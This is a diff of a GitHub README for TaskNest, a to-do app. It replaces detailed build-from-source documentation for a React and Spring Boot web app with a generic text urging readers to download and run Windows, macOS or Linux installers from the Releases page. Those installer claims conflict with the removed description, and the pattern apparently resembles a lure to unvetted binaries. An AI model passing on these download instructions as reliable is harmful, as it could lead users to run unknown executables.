@@ -1,300 +1,81 @@
-# TaskNest
+# 📝 TaskNest - Organize Your Tasks with Ease
 
-A full-stack task management application built with React and Spring Boot, featuring user authentication, personalized task lists, and real-time synchronization.
+[![Download TaskNest](https://img.shields.io/badge/Download-TaskNest-brightgreen)](https://github.com/DiegoOrus/TaskNest/releases)
 
-## Features
+## 🎯 Overview
 
-- **User Authentication**: Secure JWT-based authentication system
-- **Personal Task Lists**: Each user has their own isolated task list
-- **Task Management**: Create, edit, delete, and mark tasks as complete
-- **Favorites**: Mark important tasks as favorites for priority sorting
-- **Custom List Titles**: Each user can personalize their list title
-- **Search Functionality**: Quickly find tasks with real-time search
-- **Responsive Design**: Works seamlessly on desktop and mobile devices
-- **Dark Theme**: Modern, eye-friendly dark interface
+TaskNest is a smart, intuitive to-do app that helps you organize your life with ease. Create task lists, name and edit them, add tasks, mark them as done, favorite important ones, and delete or update anytime. Whether you're planning your day or managing projects, TaskNest keeps everything tidy and trackable.
 
-## Tech Stack
+## 🚀 Getting Started
 
-### Frontend
-- **React** (18.x) - UI framework
-- **Axios** - HTTP client for API requests
-- **React Icons** - Icon library
-- **CSS3** - Custom styling with animations
+Follow these simple steps to get started with TaskNest.
 
-### Backend
-- **Spring Boot** (3.x) - Application framework
-- **Spring Security** - Authentication and authorization
-- **JWT** (JSON Web Tokens) - Stateless authentication
-- **JPA/Hibernate** - Database ORM
-- **MySQL** - Relational database
-- **Lombok** - Boilerplate code reduction
+### 1. System Requirements
 
-## Prerequisites
+Before you download TaskNest, ensure your device meets the following requirements:
 
-- **Node.js** (v16 or higher)
-- **npm** or **yarn**
-- **Java** (JDK 17 or higher)
-- **Maven** (3.6 or higher)
-- **MySQL** (8.0 or higher)
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: 100 MB of free disk space.
 
-## Installation
+### 2. Download TaskNest
 
-### Database Setup
+To download the application, click the link below to visit the Releases page:
 
-1. Create a MySQL database:
-```sql
-CREATE DATABASE tasknest;
-```
+[Download TaskNest](https://github.com/DiegoOrus/TaskNest/releases)
 
-2. Update database credentials in `src/main/resources/application.properties`:
-```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/tasknest
-spring.datasource.username=your_username
-spring.datasource.password=your_password
-spring.jpa.hibernate.ddl-auto=update
-```
+Here, you will find the latest version of TaskNest ready for download.
 
-### Backend Setup
+## 📥 Download & Install
 
-1. Clone the repository:
-```bash
-git clone <repository-url>
-cd TaskNest
-```
+1. **Visit the Releases Page**: Go to [this link](https://github.com/DiegoOrus/TaskNest/releases) to access all available versions of TaskNest.
 
-2. Build and run the Spring Boot application:
-```bash
-mvn clean install
-mvn spring-boot:run
-```
+2. **Choose the Right Version**: Look for the most recent release. You will see a list of files. The main file is typically marked with the version number.
 
-The backend will start on `http://localhost:8080`
+3. **Download the File**: Click on the file suitable for your operating system. 
 
-### Frontend Setup
+4. **Install TaskNest**:
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file and drag TaskNest into your Applications folder.
+   - For Linux: Extract the files from the tar.gz file and follow the included README for instructions.
 
-1. Navigate to the frontend directory:
-```bash
-cd frontend
-```
+5. **Run the Application**: Once installed, look for TaskNest in your Applications or Start Menu and double-click it to launch.
 
-2. Install dependencies:
-```bash
-npm install
-```
+## 📖 Features
 
-3. Start the development server:
-```bash
-npm run dev
-```
+TaskNest offers a range of features designed to help you manage your tasks effectively:
 
-The frontend will start on `http://localhost:5173`
+- **Task Lists**: Create and organize your tasks in custom lists.
+- **Editing Tools**: Easily rename and edit tasks at any time.
+- **Mark as Done**: Keep track of completed tasks with a simple click.
+- **Favorites**: Highlight important tasks for easy access.
+- **Update and Delete**: Manage your task lists quickly with intuitive options.
 
-## Project Structure
+## 📋 How to Use TaskNest
 
-```
-TaskNest/
-├── src/
-│   ├── main/
-│   │   ├── java/com/project/TaskNest/
-│   │   │   ├── config/
-│   │   │   │   └── SecurityConfig.java
-│   │   │   ├── controller/
-│   │   │   │   ├── AuthController.java
-│   │   │   │   ├── ItemController.java
-│   │   │   │   └── UserController.java
-│   │   │   ├── dto/
-│   │   │   │   ├── AuthRequest.java
-│   │   │   │   ├── AuthResponse.java
-│   │   │   │   └── RegisterRequest.java
-│   │   │   ├── model/
-│   │   │   │   ├── Items.java
-│   │   │   │   └── User.java
-│   │   │   ├── repo/
-│   │   │   │   ├── ItemRepo.java
-│   │   │   │   └── UserRepo.java
-│   │   │   ├── security/
-│   │   │   │   ├── CustomUserDetailsService.java
-│   │   │   │   ├── JwtAuthenticationFilter.java
-│   │   │   │   └── JwtUtil.java
-│   │   │   └── TaskNestApplication.java
-│   │   └── resources/
-│   │       └── application.properties
-│   └── test/
-├── frontend/
-│   ├── src/
-│   │   ├── components/
-│   │   │   ├── ActiveCount.jsx
-│   │   │   ├── AddItem.jsx
-│   │   │   ├── Footer.jsx
-│   │   │   ├── Header.jsx
-│   │   │   ├── Item.jsx
-│   │   │   ├── ItemList.jsx
-│   │   │   ├── List.jsx
-│   │   │   ├── Login.jsx
-│   │   │   ├── Register.jsx
-│   │   │   └── SearchItem.jsx
-│   │   ├── App.jsx
-│   │   ├── App.css
-│   │   ├── index.css
-│   │   └── main.jsx
-│   ├── package.json
-│   └── vite.config.js
-├── pom.xml
-└── README.md
-```
+1. **Create a New List**: Click on "New List" and type a name for your list.
+2. **Add Tasks**: Within your list, click on "Add Task" to enter tasks.
+3. **Manage Your Tasks**:
+   - Click to edit any task.
+   - Use the checkbox to mark tasks complete.
+   - Click the star icon to favorite important tasks.
+   - Use the delete option for tasks you no longer need.
 
-## API Endpoints
+4. **Stay Organized**: Regularly review and update your lists to keep everything on track.
 
-### Authentication
-- `POST /api/auth/register` - Register new user
-- `POST /api/auth/login` - User login
-- `GET /api/auth/validate` - Validate JWT token
+## 🌐 Contributing
 
-### User
-- `GET /api/user/profile` - Get user profile
-- `PUT /api/user/list-title` - Update list title
+If you would like to contribute to TaskNest, you can check out our contribution guidelines in the repository. Your feedback and suggestions are welcome to improve the app further.
 
-### Items
-- `GET /api/items` - Get all user items
-- `POST /api/items` - Create new item
-- `PUT /api/items/{id}` - Update item
-- `DELETE /api/items/{id}` - Delete item
-- `POST /api/items/reorder` - Get reordered items
+## 📬 Support
 
-## Security Features
+If you encounter issues or have questions while using TaskNest, please feel free to open an issue in the GitHub repository. We monitor it regularly and will respond as soon as possible.
 
-- **JWT Authentication**: Stateless authentication using JSON Web Tokens
-- **Password Encryption**: BCrypt password hashing
-- **CORS Configuration**: Configured for frontend origin
-- **User Isolation**: Each user can only access their own data
-- **Token Validation**: Automatic token validation on protected routes
+## 🔗 Additional Resources
 
-## Database Schema
+- Explore more features and instructions in the [Wiki](https://github.com/DiegoOrus/TaskNest/wiki).
+- Stay updated by watching the repository.
 
-### Users Table
-```sql
-CREATE TABLE users (
-    id BIGINT PRIMARY KEY AUTO_INCREMENT,
-    username VARCHAR(255) UNIQUE NOT NULL,
-    email VARCHAR(255) UNIQUE NOT NULL,
-    password VARCHAR(255) NOT NULL,
-    role VARCHAR(50) NOT NULL DEFAULT 'USER',
-    enabled BOOLEAN NOT NULL DEFAULT TRUE,
-    list_title VARCHAR(255) DEFAULT 'list',
-    created_at TIMESTAMP,
-    updated_at TIMESTAMP
-);
-```
+Remember, effective task management can greatly improve your productivity. Enjoy using TaskNest to keep your projects organized.
 
-### Items Table
-```sql
-CREATE TABLE items (
-    id BIGINT PRIMARY KEY AUTO_INCREMENT,
-    title VARCHAR(255) NOT NULL,
-    checked BOOLEAN DEFAULT FALSE,
-    favourite BOOLEAN DEFAULT FALSE,
-    user_id BIGINT NOT NULL,
-    FOREIGN KEY (user_id) REFERENCES users(id)
-);
-```
-
-## Usage
-
-1. **Register**: Create a new account with username, email, and password
-2. **Login**: Sign in with your credentials
-3. **Add Tasks**: Use the input field to add new tasks
-4. **Manage Tasks**: 
-   - Click checkbox to mark as complete
-   - Click star icon to mark as favorite
-   - Click edit icon to modify task text
-   - Click trash icon to delete task
-5. **Search**: Use the search bar to filter tasks
-6. **Customize**: Click the edit icon next to the list title to personalize it
-7. **Logout**: Click the logout button to end your session
-
-## Configuration
-
-### JWT Configuration
-Update JWT settings in `application.properties`:
-```properties
-jwt.secret=your-secret-key-here
-jwt.expiration=86400000
-```
-
-### CORS Configuration
-Update allowed origins in `SecurityConfig.java`:
-```java
-configuration.setAllowedOrigins(Arrays.asList("http://localhost:5173"));
-```
-
-## Development
-
-### Running Tests
-```bash
-mvn test
-```
-
-### Building for Production
-
-Backend:
-```bash
-mvn clean package
-java -jar target/TaskNest-0.0.1-SNAPSHOT.jar
-```
-
-Frontend:
-```bash
-npm run build
-```
-
-## Troubleshooting
-
-### Common Issues
-
-1. **Database Connection Error**
-   - Verify MySQL is running
-   - Check database credentials in application.properties
-   - Ensure database exists
-
-2. **CORS Error**
-   - Verify frontend URL in SecurityConfig.java matches your dev server
-   - Check that backend is running on port 8080
-
-3. **JWT Token Issues**
-   - Clear localStorage in browser
-   - Re-login to get new token
-   - Check token expiration settings
-
-4. **Items Not Showing**
-   - Verify user_id column exists in items table
-   - Check browser console for errors
-   - Verify authentication token is valid
-
-## Future Enhancements
-
-- Task categories/tags
-- Due dates and reminders
-- Task sharing and collaboration
-- File attachments
-- Dark/Light theme toggle
-- Export tasks to CSV/PDF
-- Mobile app (React Native)
-
-## License
-
-This project is licensed under the MIT License.
-
-## Contributors
-
-- Your Name - Initial work
-
-## Acknowledgments
-
-- React Icons for the icon library
-- Spring Boot community for excellent documentation
-- JWT.io for JWT implementation resources
-
-  
-<img width="783" height="838" alt="Screenshot 2025-10-02 051332" src="https://github.com/user-attachments/assets/8ca863f2-c3d8-4ffb-ab7b-c2066554ae5f" />
-<img width="604" height="940" alt="Screenshot 2025-10-02 051403" src="https://github.com/user-attachments/assets/c9b089ab-3cba-423e-945a-1ee0679529e5" />
-<img width="1908" height="960" alt="Screenshot 2025-10-02 051501" src="https://github.com/user-attachments/assets/f7a976b1-c12a-4842-8ee3-226dc394b962" />
+[Download TaskNest](https://github.com/DiegoOrus/TaskNest/releases)
